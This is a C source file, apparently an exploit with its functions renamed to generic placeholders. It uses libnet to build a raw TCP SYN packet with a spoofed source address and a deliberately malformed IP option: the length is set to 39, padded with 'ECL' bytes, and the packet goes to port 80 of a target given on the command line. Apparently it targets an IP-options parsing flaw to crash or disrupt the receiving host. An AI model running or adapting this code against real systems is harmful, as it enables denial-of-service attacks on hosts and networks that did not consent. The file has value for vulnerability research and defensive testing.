#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_4__   TYPE_2__ ;
typedef  struct TYPE_3__   TYPE_1__ ;

/* Type definitions */
typedef  int /*<<< orphan*/  u_int8_t ;
typedef  int u_int32_t ;
typedef  int u_char ;
struct tcphdr {int th_off; int th_win; scalar_t__ th_urp; scalar_t__ th_sum; int /*<<< orphan*/  th_flags; scalar_t__ th_x2; scalar_t__ th_ack; scalar_t__ th_seq; void* th_dport; void* th_sport; } ;
struct TYPE_4__ {int s_addr; } ;
struct TYPE_3__ {int s_addr; } ;
struct ip {int ip_v; int ip_hl; int ip_id; int ip_ttl; TYPE_2__ ip_dst; TYPE_1__ ip_src; scalar_t__ ip_sum; int /*<<< orphan*/  ip_p; void* ip_off; void* ip_len; scalar_t__ ip_tos; } ;
typedef  int /*<<< orphan*/  libnet_t ;

/* Variables and functions */
 int IPOPTS_MAX ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int IP_H ; 
 int /*<<< orphan*/  IP_MAXPACKET ; 
 int LIBNET_ERRBUF_SIZE ; 
 int /*<<< orphan*/  LIBNET_RAW4 ; 
 int /*<<< orphan*/  LIBNET_RESOLVE ; 
 int /*<<< orphan*/  TH_SYN ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 () ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC4 (int*) ; 
 void* FUNC5 (int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int) ; 
 char* FUNC8 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * FUNC9 (int /*<<< orphan*/ ,char*,char*) ; 
 int FUNC10 (int /*<<< orphan*/ *,char*,int /*<<< orphan*/ ) ; 
 int FUNC11 (int /*<<< orphan*/ *,int*,int) ; 
 int* FUNC12 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (char*) ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int FUNC15 () ; 
 int /*<<< orphan*/  FUNC16 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC17 (int*,char*,int) ; 
 int /*<<< orphan*/  FUNC18 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC19 (char*) ; 

int FUNC20(int argc, char **argv)
{
  char errbuf[LIBNET_ERRBUF_SIZE];
  libnet_t *l;
  char *device = NULL;

  int c;
  u_char *buf;
  int packet_len = 0;

  struct ip *IP;
  struct tcphdr *TCP;
  u_int32_t src = 0, dst = 0;


  FUNC1();
  if (argc < 4) FUNC19(argv[0]);

  if ((l = FUNC9(LIBNET_RAW4, device, errbuf)) == NULL) {
    FUNC3(stderr, "libnet_init() failed: %s", errbuf);
    FUNC2(-1);
  }

  if ((src = FUNC10(l, argv[1], LIBNET_RESOLVE)) == -1) {
    FUNC3(stderr, "Unresolved source address\n");
    FUNC2(-1);
  }
  if ((dst = FUNC10(l, argv[2], LIBNET_RESOLVE)) == -1) {
    FUNC3(stderr, "Unresolved destination address\n");
    FUNC2(-1);
  }

  if ( (buf = FUNC12(IP_MAXPACKET)) == NULL ) {
    FUNC13("malloc");
    FUNC2(-1);
  }

  buf[20] = FUNC0(argv[3]);
  buf[21] = 39;                      // our malformed size

  for (c = 0; c<38; c+=3)
    FUNC17(&buf[22+c], "ECL", 3);   // padding

  TCP = (struct tcphdr *)(buf + IP_H + IPOPTS_MAX);
  TCP->th_off = 5;

  packet_len = IP_H + IPOPTS_MAX + (TCP->th_off << 2);

  FUNC16(FUNC18(NULL));
  IP = (struct ip *) buf;
  IP->ip_v    = 4;                   /* version 4 */
  IP->ip_hl   = 5 + (IPOPTS_MAX / 4);/* 60 byte header */
  IP->ip_tos  = 0;                   /* IP tos */
  IP->ip_len  = FUNC5(packet_len);   /* total length */
  IP->ip_id   = FUNC15();              /* IP ID */
  IP->ip_off  = FUNC5(0);            /* fragmentation flags */
  IP->ip_ttl  = 64;                  /* time to live */
  IP->ip_p    = IPPROTO_TCP;         /* transport protocol */
  IP->ip_sum  = 0;
  IP->ip_src.s_addr = src;
  IP->ip_dst.s_addr = dst;

  TCP->th_sport = FUNC5(1337);
  TCP->th_dport = FUNC5(80);
  TCP->th_seq   = 0;
  TCP->th_ack   = 0;
  TCP->th_x2    = 0;
  TCP->th_flags = TH_SYN;
  TCP->th_win   = FUNC15() & 0xffff;
  TCP->th_sum   = 0;
  TCP->th_urp = 0;

  FUNC7(l, (u_int8_t *)buf, IPPROTO_TCP, TCP->th_off << 2);

  if ((c = FUNC11(l, buf, packet_len)) == -1)
    {
      FUNC3(stderr, "Write error: %s\n", FUNC8(l));
      FUNC2(-1);
    }

  FUNC14("Packet sent.\n");

  FUNC6(l);
  FUNC4(buf);
  return (0);
}